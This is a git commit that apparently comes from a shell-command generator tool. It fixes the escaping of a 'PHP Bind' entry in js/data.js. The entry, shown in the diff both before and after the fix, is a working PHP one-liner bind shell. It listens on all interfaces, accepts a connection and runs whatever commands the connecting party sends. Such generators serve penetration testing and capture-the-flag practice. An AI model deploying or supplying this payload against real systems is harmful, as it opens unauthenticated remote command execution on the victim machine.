b7b7ee548f48a192951ca2839f56a1ccf2f6c6da
Ryan Montgomery <44453666+0dayCTF@users.noreply.github.com>
2021-03-19 14:47:58 -0400

    Update data.js
    Fixed PHP Bind Shell

--- js/data.js
+++ js/data.js
@@ -241,7 +241,7 @@ const bindShellCommands =  withCommandType(
         },
         {
             "name": "PHP Bind",
-            "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});\\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);\\socket_write($cl,$m,strlen($m));}}'",
+            "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);\\socket_write($cl,$m,strlen($m));}}'",
             "meta": ["bind", "mac", "linux", "windows"]
         }
     ]
